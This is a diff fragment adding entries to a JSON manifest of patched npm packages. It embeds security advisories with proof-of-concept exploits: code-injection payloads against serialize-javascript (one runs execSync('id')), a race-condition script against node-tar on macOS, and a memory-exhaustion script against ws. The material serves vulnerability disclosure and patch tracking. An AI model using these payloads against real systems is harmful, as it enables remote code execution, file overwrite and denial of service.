+    "pkg:npm/serialize-javascript@3.1.0": {
+      "uuid": "7bf4a41e-30eb-466f-a51b-b82edd1202ac",
+      "exportedAt": "Mon, 27 Jul 2026 21:52:41 GMT",
+      "files": {
+        "index.js": {
+          "beforeHash": "6bc7c25986eae8718dac89aeac9377e9b1e2a0d41bd360df47210eb5a3229a7c",
+          "afterHash": "8f004c3915c239ccac93b47ddb3b4edb9f714c11989aadcd41819294e66cea79"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-5c6j-r48x-rmvq": {
+          "cves": [],
+          "summary": "Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()",
+          "severity": "HIGH",
+          "description": "### Impact\n\nThe serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () => 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () => '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\" — injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return '\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"'; };\nfakeDate.toJSON = function() { return '2024-01-01'; };\nconst output = serialize({ d: fakeDate });\n// Output: {\"d\":new Date(\"\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"\")}\neval('obj = ' + output);\nconsole.log(global.DATE_PWNED); // \"DATE_INJECTION\" — injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, 'source', { get: () => 'x' });\nObject.defineProperty(rceRegex, 'flags', {\n  get: () => '\"+require(\"child_process\").execSync(\"id\").toString()+\"'\n});\nrceRegex.toJSON = function() { return '@rce'; };\nconst output = serialize({ re: rceRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+require(\"child_process\").execSync(\"id\").toString()+\"\")}\n// When eval'd on a Node.js server, executes the \"id\" system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3"
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/tar@6.1.0": {
+      "uuid": "167721b8-d8ed-4469-b0cf-f343d73199aa",
+      "exportedAt": "Fri, 31 Jul 2026 00:18:54 GMT",
+      "files": {
+        "lib/path-reservations.js": {
+          "beforeHash": "5f8d390ac65fe0bc2ca1ba7317bd744cbc6f876dc6f7c2d6257cea307e8674a9",
+          "afterHash": "3bc72b80c33bd72cfadf450eef6bfcd03bfb82919191eae258c74a78769e3040"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-r6q2-hw4h-h46w": {
+          "cves": [
+            "CVE-2026-23950"
+          ],
+          "summary": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
+          "severity": "HIGH",
+          "description": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---"
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/ws@7.5.5": {
+      "uuid": "eb557522-0066-43ba-b595-837e958a9635",
+      "exportedAt": "Fri, 07 Aug 2026 20:52:37 GMT",
+      "files": {
+        "lib/receiver.js": {
+          "beforeHash": "32eecaf14756a9decdef635e306382eb6de4eb0589f28fec9e086a532af55830",
+          "afterHash": "c81493f3d8b4fc805b3d9c5bc97d8da6be6a12896b81a6b6bedad4eb7ef74589"
+        },
+        "lib/websocket-server.js": {
+          "beforeHash": "243bf3a04d2519e9a3c62fcf916919f1a9d4206209624a3739a3777e10b722ca",
+          "afterHash": "9ccdc947e272e4672a34c5bdf41e466a8d76b3948edab60ecaa8928f424f7ae6"
+        },
+        "lib/websocket.js": {
+          "beforeHash": "117ef3ee2a0e862043cb326875d6023d7d09750d38536b9e2efad6535463ad04",
+          "afterHash": "0b3d043bfb6fa36c3ef941606981203141b21f4eabbcf415d2f4ed3e028fc781"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-96hv-2xvq-fx4p": {
+          "cves": [
+            "CVE-2026-48779"
+          ],
+          "summary": "ws: Memory exhaustion DoS from tiny fragments and data chunks",
+          "severity": "HIGH",
+          "description": "### Impact\n\nA high volume of exceptionally small fragments and data chunks can be sent by a peer, with modest network traffic, to force the remote peer into allocating and holding structural wrappers that consume far more memory than the default documented message-size limit, leading to process termination due to OOM.\n\n### Proof of concept\n\n```js\nimport { WebSocket, WebSocketServer } from 'ws';\n\nconst wss = new WebSocketServer({ port: 0 }, function () {\n  const data = Buffer.alloc(1);\n  const options = { fin: false };\n  const { port } = wss.address();\n  const ws = new WebSocket(`ws://localhost:${port}`);\n\n  ws.on('open', function () {\n    (function send() {\n      ws.send(data, options, function (err) {\n        if (err) return;\n        send();\n      });\n    })();\n  });\n\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`client close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n\nwss.on('connection', function (ws) {\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`server close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.21.0 (https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94) and backported to ws@7.5.11 (https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8), ws@6.2.4 (https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7), and ws@5.2.5 (https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53).\n\n### Workarounds\n\nIn vulnerable versions, the issue can be mitigated by lowering the value of the `maxPayload` option if possible.\n\n### Credits\n\nThe vulnerability was responsibly disclosed and fixed by [Nadav Magier](https://github.com/Nadav0077)."
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/xmldom@0.6.0": {
+      "uuid": "4bada17e-58e6-41ed-9a76-5d4de89323a1",
+      "exportedAt": "Thu, 02 Apr 2026 20:57:33 GMT",
+      "files": {
+        "package/lib/dom.js": {
+          "beforeHash": "48041cba3eb17e77648d22b342d3051537c58d88305f4925f629978c0bdb9b69",
+          "afterHash": "064d95b32a16b359ced51d4a6979e9a965b8edbaa8bcf77e851e9e786b108eff"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-crh6-fp67-6883": {
+          "cves": [
+            "CVE-2022-39353"
+          ],
+          "summary": "xmldom allows multiple root nodes in a DOM",
+          "severity": "CRITICAL",
+          "description": "### Impact\nxmldom parses XML that is not well-formed because it contains multiple top level elements, and adds all root nodes to the `childNodes` collection of the `Document`, without reporting any error or throwing.\nThis breaks the assumption that there is only a single root node in the tree, which led to https://nvd.nist.gov/vuln/detail/CVE-2022-39299 and is a potential issue for dependents.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.4` (dist-tag `next`).\n\n### Workarounds\nOne of the following approaches might help, depending on your use case:\n- Instead of searching for elements in the whole DOM, only search in the `documentElement`.\n- Reject a document with a document that has more then 1 `childNode`.\n\n### References\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n"
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    }
+  }
+}
